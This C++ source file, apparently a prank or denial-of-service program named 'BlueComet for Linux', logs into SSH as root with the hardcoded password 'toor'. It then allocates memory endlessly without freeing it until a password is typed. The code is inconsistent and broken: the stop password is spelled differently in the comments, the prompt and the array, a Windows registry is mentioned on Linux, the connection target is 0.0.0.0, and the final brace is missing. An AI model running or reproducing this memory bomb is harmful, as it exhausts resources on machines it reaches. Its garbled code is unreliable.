/*
#    #    #    ######  ####### ####### 
#   #    # #   #     # #     # #     # 
#  #    #   #  #     # #     # #     # 
###    #     # ######  #     # #     # 
#  #   ####### #       #     # #     # 
#   #  #     # #       #     # #     # 
#    # #     # #       ####### ####### 

BlueComet for Linux

*/



#include <iostream>
#include <string>    
#include <cstring>
#include <libssh/libssh.h>
#include <cstring>
#include <cstdlib>

using namespace std;

int main()

{
	/* Allow SSH Connections on any network. */
    const char* host = "0.0.0.0"; 
    int port = 2345;

    ssh_session session = ssh_new();
    if (session == NULL) {
        cerr << "Error creating SSH session" << endl;
        return 1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, "root"); // replace with your admin username
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc"); 

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
        ssh_free(session);
        return 1;
    }

    rc = ssh_userauth_password(session, NULL, "toor"); // replace with your admin password
    if (rc != SSH_AUTH_SUCCESS) {
        cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return 1;
    }

    /* Password to stop memory crash is P@thf1nder */
    const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
    char input[11];
    bool stopProgram = false;
    int loopCount = 0;

    while (!stopProgram) {
        for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
            char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
            memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
        }

        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed." << endl;
        loopCount++;
    /*Enter Password: Pathf1nder to stop. Remove BlueComet from registry to remove program.*/
        cout << "Enter password P@thF1nder to stop the program: ";
        cin >> input;
        if (strcmp(input, password) == 0) {
            cout << "Password correct. Stopping program. Remove BlueComet from memory or this will happen again." << endl;
            stopProgram = true;
        }
    }
    return 0;
